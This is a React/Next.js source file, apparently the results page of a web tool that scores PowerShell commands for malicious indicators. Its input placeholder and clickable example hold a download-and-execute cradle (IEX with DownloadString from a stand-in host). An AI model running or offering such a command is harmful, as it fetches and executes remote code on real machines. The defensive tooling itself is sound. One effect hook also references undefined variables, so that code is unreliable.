"use client";
import { useSearchParams, useRouter } from "next/navigation";
import { useEffect, useState, useCallback, useRef } from "react";
import { useAuth } from "../contexts/AuthContext";
import { useAnalysisEvent } from "../contexts/AnalysisEventContext";
import { useRateLimit } from "../../hooks/useRateLimit";
import { useIpAddress } from "../../hooks/useIpAddress";
import SeverityLegend from "../components/SeverityLegend";
import AnalysisCard from "../components/AnalysisCard";
import SeverityBadge from "../components/SeverityBadge";
import IndicatorTable from "../components/IndicatorTable";
import ThemedButton from "../components/ThemedButton";
import LoadingSpinner from "../components/LoadingSpinner";
import AnalysisSkeleton from "../components/AnalysisSkeleton";
import CommandInput from "../components/CommandInput";
import { ErrorMessage, InfoMessage } from "../components/Messages";
import IndicatorsSummaryTable from "../components/IndicatorsSummaryTable";

  import { saveAnonymousAnalysis } from "../../utils/cookies";
import { getOrCreateSession, saveSessionFromBackend } from "../../utils/session";

// Score-based color system (5 bins from 1-10)
function getScoreColor(score) {
  if (score >= 10) return "border-red-600 text-red-600";           // Critical: 10.0+
  if (score >= 8) return "border-orange-400 text-orange-400";      // High: 8.0+
  if (score >= 5) return "border-yellow-400 text-yellow-400";      // Medium: 5.0+
  if (score >= 2) return "border-green-400 text-green-400";        // Low: 2.0+
  return "border-green-400 text-green-400";                          // Informational: 1.0
}

function getScoreLabel(score) {
  if (score >= 10) return "CRITICAL";
  if (score >= 8) return "HIGH";
  if (score >= 5) return "MEDIUM";
  if (score >= 2) return "LOW";
  return "INFORMATIONAL";
}

export default function AnalysisPage() {
  const params = useSearchParams();
  const router = useRouter();
  const { user, isAuthenticated } = useAuth();
  const { notifyNewAnalysis } = useAnalysisEvent();
  const { ipAddress, ipCountry, loading: ipLoading, error: ipError } = useIpAddress();
  const { 
    rateLimitInfo, 
    handleRateLimitResponse, 
    reset: resetRateLimit,
    timeLeft,
    isTimerActive,
    formatTime
  } = useRateLimit();
  const [result, setResult] = useState(null);
  const [cmd, setCmd] = useState("");
  const [loading, setLoading] = useState(true);
  const [freshAnalysisLoading, setFreshAnalysisLoading] = useState(false); // ⚡ Novo estado para análise fresca
  const [error, setError] = useState("");
  const [newCommand, setNewCommand] = useState("");
  const [contentReady, setContentReady] = useState(false);
  const analysisExecutedRef = useRef(false);


  const performAnalysis = useCallback(
    async (command, providedIpAddress, providedIpCountry) => {
      const finalIpAddress = providedIpAddress || ipAddress;
      const finalIpCountry = providedIpCountry || ipCountry;
      try {
        setError("");
        
        console.log("🔍 [ANALYSIS_LEGACY] Analyzing command:", command.substring(0, 100) + "...");
        
        const timeoutPromise = new Promise((_, reject) =>
          setTimeout(() => reject(new Error('Analysis timeout - taking too long')), 15000)
        );
        const sessionId = getOrCreateSession();
        
        // ✅ FIX: Enviar comando sem trim - preservar espaços
        const requestData = { 
          command: command, // ✅ SEM TRIM
          user_id: user?.id || null, 
          ip_address: finalIpAddress,
          country: finalIpCountry,
          user_agent: navigator.userAgent,
          search_type: "WEB",  
          session_id: sessionId
        };
        
        console.log("🌐 [ANALYSIS_LEGACY] Request type:", user?.id ? "Authenticated WEB" : "Anonymous WEB");

        const { makeAuthenticatedRequest } = await import('../../lib/api');
        
        const analysisPromise = makeAuthenticatedRequest('/evaluate', {
          method: 'POST',
          body: JSON.stringify(requestData)
        }).then(async response => {
          const data = await response.json();
          
          const isFromCache = data.from_cache === true;
          
          if (isFromCache) {
            setFreshAnalysisLoading(false);
          } else {
           
            
            setFreshAnalysisLoading(true);
          }
          
          const needsHandling = handleRateLimitResponse(response, data);
          
          if (needsHandling) {
            throw new Error('Rate limit excedido');
          }
          
          if (!response.ok) {
            throw new Error(data.error || `HTTP error! status: ${response.status}`);
          }
          
          return data;
        }).catch(error => {
          setFreshAnalysisLoading(true);
          if (error.message === 'Rate limit excedido') {
            throw error;
          }
          throw new Error(`Erro da API: ${error.message}`);
        });
   
        let response;
        try {
          response = await analysisPromise;
        } catch (error) {
        
          throw error;
        }
        
        if (response.success) {
          const isFromCache = response.from_cache === true;
          
          const analysisData = response.analysis;
          
          if (response.session_id && !user?.id) {
            saveSessionFromBackend(response.session_id);
          }
          
          if (!user?.id) {
            try {
              saveAnonymousAnalysis({
                command: command,
                score: analysisData.risk_score,
                severity: analysisData.is_malicious ? "malicious" : "safe",
                signatures: analysisData.signatures_detected || [],
                cmdlets_detected: analysisData.cmdlets_detected || [],
                analysis_id: response.analysis_id
              });
            } catch (error) {
              console.error('❌ [ANALYSIS PAGE] error:', error);
            }
          }
          
          if (response.analysis_id) {

            notifyNewAnalysis();
            
     
            router.push(`/analysis/${response.analysis_id}`);
            return; 
          }
          
          const analysisResult = {
            score: analysisData.risk_score,
            severity: analysisData.is_malicious ? "malicious" : "safe",
            signatures: (analysisData.signatures_detected || []).sort((a, b) => (b.total_score || 0) - (a.total_score || 0)),
            decoded: analysisData.decoded_command || null,
            doubleDecoded: analysisData.double_decoded_command || null,
            indicators: analysisData.analysis_details?.indicators || [],
            details: analysisData.analysis_details?.recommendations?.join(", ") || "",
            tactics: analysisData.tactics || [],
            techniques: analysisData.techniques || [],
            analysisId: response.analysis_id, 
            fromCache: isFromCache,
            cacheInfo: response.analysis?.cache_info
          };
          
          setResult(analysisResult);
          
          // Smooth transition delay
          setTimeout(() => {
            setContentReady(true);
          }, 150);
        } else {
          throw new Error(response.error || 'Analysis failed');
        }
      } catch (err) {
        if (err.message === 'Rate limit excedido') {
          setLoading(false);
          setFreshAnalysisLoading(false);
          setContentReady(true);
          return; 
        }
        
        setError(err.message);
        setResult(null);
        setContentReady(true);
      } finally {
        setLoading(false);
        setFreshAnalysisLoading(false);
      }
    },
    [
      ipAddress,
      ipCountry,
      user,
      notifyNewAnalysis,
      router,
      handleRateLimitResponse,
      setError,
      setFreshAnalysisLoading,
      setResult,
      setLoading
    ]
  );

  const handleNewAnalysis = async () => {
    // ✅ FIX: Enviar comando raw sem validação de trim
    if (newCommand.length > 0) {
      if (rateLimitInfo && rateLimitInfo.current_count >= rateLimitInfo.limit) {
        setError("Rate limit reached. Please wait for the timer to reset.");
        return;
      }
      
      analysisExecutedRef.current = false; 
      setError("");
      
      // ✅ FIX: Enviar comando raw sem trim ou validação
      await performAnalysis(newCommand);
      
      setNewCommand("");
    }
  };

  useEffect(() => {
    const command = params.get("cmd") || "";
    const ipAddress = params.get("ip") || null;
    const country = params.get("country") || null;
    
    setCmd(command);
    setNewCommand(command);
    
    // ✅ FIX: Processar comando mesmo que seja vazio ou apenas espaços
    if (command.length > 0 && !analysisExecutedRef.current) {
      analysisExecutedRef.current = true;
      
      const ipLocation = {
        country,
        city,
        region,
        timezone
      };
      
      performAnalysis(command);
    } else if (command.length === 0) {
      setLoading(false);
      setContentReady(true);
      setResult({
        score: 0,
        severity: "safe",
        signatures: [],
        decoded: null,
        indicators: [],
        details: "No command to analyze"
      });
    }
  }, [params, performAnalysis]);
  
  const totalScore = result ? result.score : 0;
  
  if (loading && freshAnalysisLoading && !contentReady) {
    return <AnalysisSkeleton />;
  }

  return (
    <div className="flex-1 flex flex-col items-center justify-center p-4 sm:p-6 md:p-8 animate-fade-in">
      <style jsx>{`
        @keyframes fade-in {
          from {
            opacity: 0;
            transform: translateY(10px);
          }
          to {
            opacity: 1;
            transform: translateY(0);
          }
        }
        .animate-fade-in {
          animation: fade-in 0.4s ease-out;
        }
      `}</style>
      <h1 className="text-2xl sm:text-3xl md:text-4xl font-mono font-bold mb-6 sm:mb-8 text-center" style={{color: 'var(--accent)'}}>
         Evaluation Results
       </h1>

    
      <div className="w-full max-w-sm sm:max-w-lg md:max-w-2xl lg:max-w-4xl mb-6 sm:mb-8">
        <div className="flex flex-col sm:flex-row gap-3 items-start">
          <div className="flex-1 w-full">
            <CommandInput
              value={newCommand}
              onChange={(e) => setNewCommand(e.target.value)}
              onSubmit={handleNewAnalysis}
              placeholder="Type or paste a PS payload..."
              disabled={freshAnalysisLoading || (rateLimitInfo && rateLimitInfo.current_count >= rateLimitInfo.limit)}
            />
          </div>
          <ThemedButton
            onClick={handleNewAnalysis}
            disabled={newCommand.length === 0 || freshAnalysisLoading || (rateLimitInfo && rateLimitInfo.current_count >= rateLimitInfo.limit)}
            className="flex-shrink-0"
            loading={freshAnalysisLoading}
          >
            {freshAnalysisLoading ? 'Analyzing...' : 'Evaluate'}
          </ThemedButton>
        </div>
        <InfoMessage 
          message={!error && newCommand.length === 0 ? "Example: IEX(New-Object Net.WebClient).DownloadString('http://bad.site/payload.ps1')" : ""}
          clickable={!error && newCommand.length === 0}
          onClick={() => setNewCommand("IEX(New-Object Net.WebClient).DownloadString('http://bad.site/payload.ps1')")}
        />
      </div>

      {rateLimitInfo && (
        <div className="w-full max-w-sm sm:max-w-lg md:max-w-2xl lg:max-w-4xl mt-4 mb-6 rounded-lg border-2 bg-black/80 border-green-500/30">
          <div className="p-4">
            <div className="text-center mb-4">
              <div className="font-mono text-sm mb-2" style={{color: 'var(--muted-foreground)'}}>
                <strong>Notice:</strong> You have made <span style={{color: 'var(--accent)'}}>{rateLimitInfo.current_count}</span> of <span style={{color: 'var(--accent)'}}>{rateLimitInfo.limit}</span> allowed searches in {rateLimitInfo.window_seconds} seconds.
              </div>
            </div>

            {rateLimitInfo.current_count >= rateLimitInfo.limit && (
              <div>
                <div className="text-center mb-6">
                  <div className="inline-flex items-center gap-3 px-4 py-2 rounded-full border-2 border-red-500 bg-black/80 border-green-500/30">
                    <span className="text-2xl">🚫</span>
                    <span className="font-mono font-bold text-red-500">Rate limit reached</span>
                  </div>
                </div>
                
                {isTimerActive && timeLeft > 0 && (
                  <div className="text-center">
                    <div className="inline-block p-6 rounded-xl border-2 bg-black/80 border-green-500/30">
                      <div className="text-4xl mb-3">⏰</div>
                      
                      <div className="font-mono font-bold text-xl mb-3" style={{color: 'var(--accent)'}}>
                        Wait for reset
                      </div>
                      
                      <div className="font-mono text-3xl font-bold mb-4 px-4 py-2 rounded-lg border bg-black/80 border-green-500/30" style={{
                        color: 'var(--accent)'
                      }}>
                        {formatTime}
                      </div>
                      
                      <div className="font-mono text-sm max-w-xs mx-auto" style={{color: 'var(--muted-foreground)'}}>
                        You can make new searches when the timer reaches zero
                      </div>
                      
                      <div className="mt-4 w-full bg-gray-200 dark:bg-gray-700 rounded-full h-2">
                        <div 
                          className="h-2 rounded-full transition-all duration-1000" 
                          style={{
                            backgroundColor: 'var(--accent)',
                            width: `${Math.max(0, (timeLeft / 60) * 100)}%`
                          }}
                        ></div>
                      </div>
                    </div>
                  </div>
                )}
              </div>
            )}
          </div>
        </div>
      )}

     
      {result && (
        <div className="w-full max-w-sm sm:max-w-lg md:max-w-2xl lg:max-w-4xl mb-6 sm:mb-8">
          <div className="p-4 sm:p-6 rounded-lg border-2 border-green-400 text-center relative bg-black/80 border-green-500/30">
            <div className="absolute top-4 right-4">
              <SeverityLegend />
            </div>
            
            <div className="text-lg sm:text-xl font-mono font-bold mb-3 text-green-400">
              Cumulative Base Score
            </div>
            <div className="text-4xl sm:text-5xl font-mono font-bold mb-3 text-white">
              {totalScore.toFixed(1)}
            </div>
            <div className="text-xs sm:text-sm font-mono text-green-400 mb-2">
              {totalScore === 0 ? "No Malicious Indicators Detected" : "Cumulative score from all patterns"}
            </div>
            {result.signatures && result.signatures.length > 0 && (
              <div className="text-xs font-mono text-gray-400  pt-3 mt-3">
                {(() => {
                  const securitySigs = result.signatures.filter(sig => 
                    !sig.name.includes('(') || sig.score >= 4.0 || !sig.techniques?.includes('T1059.001') || sig.tactics?.length > 1
                  );
                  const allCmdlets = result.signatures.filter(sig => 
                    sig.name.includes('(') && sig.score < 4.0 && sig.techniques?.includes('T1059.001') && sig.tactics?.length <= 1
                  );
                  
                  const securityScore = securitySigs.reduce((sum, sig) => sum + (sig.total_score || sig.score || 0), 0);
                  const allCmdletScore = allCmdlets.reduce((sum, sig) => sum + (sig.total_score || sig.score || 0), 0);
                  
                  return (
                    <>
                      {allCmdletScore > 0 && <div>PowerShell Cmdlets: {allCmdletScore.toFixed(1)}</div>}
                    </>
                  );
                })()}
              </div>
            )}
          </div>
        </div>
      )}

      {/* ❌ REMOVER COMPLETAMENTE - NÃO DEIXAR COMENTADO */}
      {/* NÃO DEIXE NENHUM BLOCO ANTIGO AQUI */}

      {/* ✅ BLOCO 1: Double-encoded (decoded && doubleDecoded) */}
      {result && result.decoded && result.doubleDecoded && (() => {
        console.log("🟦 [RENDER] DOUBLE LAYER - First decoded");
        return (
          <div className="w-full max-w-sm sm:max-w-lg md:max-w-2xl lg:max-w-4xl mb-6 sm:mb-8">
            <div className="border rounded-lg p-4 bg-black/80 border-blue-500/30">
              <div className="font-mono text-sm font-bold mb-3" style={{color: 'var(--accent)'}}>
                 First Decoded Layer (Iteration 1)
              </div>
              <div className="bg-black rounded p-3 border border-blue-500/20 text-xs sm:text-sm font-mono overflow-x-auto max-h-40 whitespace-pre-wrap break-words" style={{color: 'var(--foreground)'}}>
                <code>{result.decoded}</code>
              </div>
              <div className="text-xs font-mono mt-2" style={{color: 'var(--muted-foreground)'}}>
                First layer of decoding - still contains -EncodedCommand
              </div>
            </div>
          </div>
        );
      })()}

      {/* ✅ BLOCO 2: Single-encoded (decoded && !doubleDecoded) */}
      {result && result.decoded && !result.doubleDecoded && (() => {
        console.log("🟦 [RENDER] SINGLE LAYER - Full decoded");
        return (
          <div className="w-full max-w-sm sm:max-w-lg md:max-w-2xl lg:max-w-4xl mb-6 sm:mb-8">
            <div className="border rounded-lg p-4 bg-black/80 border-blue-500/30">
              <div className="font-mono text-sm font-bold mb-3" style={{color: 'var(--accent)'}}>
                🔓 Decoded Command
              </div>
              <div className="bg-black rounded p-3 border border-blue-500/20 text-xs sm:text-sm font-mono overflow-x-auto max-h-40 whitespace-pre-wrap break-words" style={{color: 'var(--foreground)'}}>
                <code>{result.decoded}</code>
              </div>
              <div className="text-xs font-mono mt-2" style={{color: 'var(--muted-foreground)'}}>
                This is the decoded version from -EncodedCommand
              </div>
            </div>
          </div>
        );
      })()}

      {/* ✅ BLOCO 3: Final layer (doubleDecoded exists) */}
      {result && result.doubleDecoded && (() => {
        console.log("🟨 [RENDER] DOUBLE LAYER - Final decoded");
        return (
          <div className="w-full max-w-sm sm:max-w-lg md:max-w-2xl lg:max-w-4xl mb-6 sm:mb-8">
            <div className="border rounded-lg p-4 bg-black/80 border-yellow-500/30">
              <div className="font-mono text-sm font-bold mb-3" style={{color: 'var(--accent)'}}>
                 Final Decoded Command (Iteration 2)
              </div>
              <div className="bg-black rounded p-3 border border-yellow-500/20 text-xs sm:text-sm font-mono overflow-x-auto max-h-40 whitespace-pre-wrap break-words" style={{color: 'var(--foreground)'}}>
                <code>{result.doubleDecoded}</code>
              </div>
              <div className="text-xs font-mono mt-2" style={{color: 'var(--muted-foreground)'}}>
                Final layer decoded from multiple nested -EncodedCommand (2+ layers detected)
              </div>
            </div>
          </div>
        );
      })()}

      {result && result.signatures && result.signatures.length > 0 && (
         <div className="w-full max-w-sm sm:max-w-lg md:max-w-2xl lg:max-w-4xl mb-6 sm:mb-8">
          {(() => {
            const realSignatures = result.signatures.filter(sig => 
              !sig.name.includes('(') || 
              sig.score >= 4.0 || 
              !sig.techniques?.includes('T1059.001') || 
              sig.tactics?.length > 1 
            );
            
            const basicCmdlets = result.signatures.filter(sig => 
              sig.name.includes('(') &&
              sig.score < 4.0 && 
              sig.techniques?.includes('T1059.001') && 
              sig.tactics?.length <= 1
            );

            return (
              <>
                {/* ✅ NOVO: Tabela de resumo */}
                {realSignatures.length > 0 && (
                  <IndicatorsSummaryTable signatures={realSignatures} />
                )}
                
                {realSignatures.length > 0 && (
                  <div className="mb-6">
                    <h2 className="text-lg sm:text-xl font-mono font-bold mb-4" style={{color: 'var(--foreground)'}}>
                      Indicators Breakdown
                    </h2>
                    <div className="space-y-4">
                      {realSignatures.map((signature, index) => (
                        <AnalysisCard
                          key={`real-${index}`}
                          index={index}  // ✅ Passar index
                          title={signature.name || 'Unknown Pattern'}
                          description={signature.description || `Pattern detected: ${signature.pattern || 'No description available'}`}
                          severity={signature.severity || 'unknown'}
                          score={signature.total_score || signature.score || 0}
                          pattern={signature.pattern || 'No pattern specified'}
                          matched_text={signature.matched_text || signature.matchedText || ''}
                          matched_command={signature.matched_command || signature.matchedCommand || ''}
                          keywords={signature.pattern || signature.keyword || ''}
                          tactic={signature.tactics || signature.tactic || []}
                          technique={signature.techniques || signature.technique || []}
                          reference={signature.reference || ''}
                          link={signature.link || null}
                          matchesInfo={{
                            matchesFound: signature.matches_found || 1,
                            baseScore: signature.base_score || signature.score || 0,
                            totalScore: signature.total_score || signature.score || 0,
                            maxMatchAllowed: signature.max_match_allowed || signature.max_match || 1,
                            matchesDetails: signature.matches_details || signature.matchesDetails || []
                          }}
                        />
                      ))}
                    </div>
                  </div>
                )}

                {basicCmdlets.length > 0 && (
                    <div className="mb-6">
                      <h3 className="text-base font-mono font-bold mb-3" style={{color: 'var(--muted-foreground)'}}>
                        PowerShell Cmdlets ({basicCmdlets.length})
                      </h3>
                    <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-3">
                      {basicCmdlets.map((cmdlet, index) => (
                        <div 
                          key={`cmdlet-${index}`}
                          className="border rounded p-3 text-center bg-black/80 border-green-500/30"
                        >
                          <div className="font-mono text-sm font-bold mb-1" style={{color: 'var(--foreground)'}}>
                            {cmdlet.name}
                          </div>
                          <div className="text-xs font-mono" style={{color: 'var(--muted-foreground)'}}>
                            Score: {cmdlet.total_score || cmdlet.score} • Basic PowerShell
                          </div>
                          {cmdlet.matches_found > 1 && (
                            <div className="text-xs font-mono mt-1" style={{color: 'var(--accent)'}}>
                              {cmdlet.matches_found} matches • Base: {cmdlet.base_score || cmdlet.score}
                            </div>
                          )}
                        </div>
                      ))}
                    </div>
                  </div>
                )}
              </>
            );
          })()}
        </div>
      )}

      {result && (!result.signatures || result.signatures.length === 0) && totalScore === 0 && (
               <div className="w-full max-w-sm sm:max-w-lg md:max-w-2xl lg:max-w-4xl mb-6 sm:mb-8">
         <div className="border rounded-lg p-6 text-center bg-black/80 border-green-500/30">
           <h2 className="text-lg sm:text-xl font-mono font-bold mb-2" style={{color: 'var(--foreground)'}}>
             Zero indicators found
           </h2>
           <p className="text-sm sm:text-base font-mono" style={{color: 'var(--muted-foreground)'}}>
             This command does not seem to match any indicator.
           </p>
         </div>
       </div>
      )}

      {result && result.signatures && result.signatures.length > 0 && (
        <div className="w-full max-w-sm sm:max-w-lg md:max-w-2xl lg:max-w-4xl mb-6 sm:mb-8">
          <div className="border rounded-lg p-4 bg-black/80 border-green-500/30">
            <div className="font-mono text-sm" style={{color: 'var(--muted-foreground)'}}>
              Matched indicators are not inherently suspicious but highlight traces that may require closer examination. For interpretation details, check the link below:
              <br /><br />
              <span style={{color: 'var(--primary-purple)'}}>&lt;wiki link to be provided later&gt;</span>
            </div>
          </div>
        </div>
      )}

      <div className="flex flex-col sm:flex-row gap-3 justify-center mb-8">
        <ThemedButton onClick={() => router.push('/')}>
          Evaluate Another Command
        </ThemedButton>
        <ThemedButton
          variant="outline"
          onClick={() => {
            const baseUrl = window.location.origin;
            const shareUrl = result?.analysisId 
              ? `${baseUrl}/analysis/${result.analysisId}`
              : window.location.href; 
            navigator.clipboard.writeText(shareUrl);
          }}
        >
          Copy sharable link
        </ThemedButton>
      </div>
    </div>
  );
}
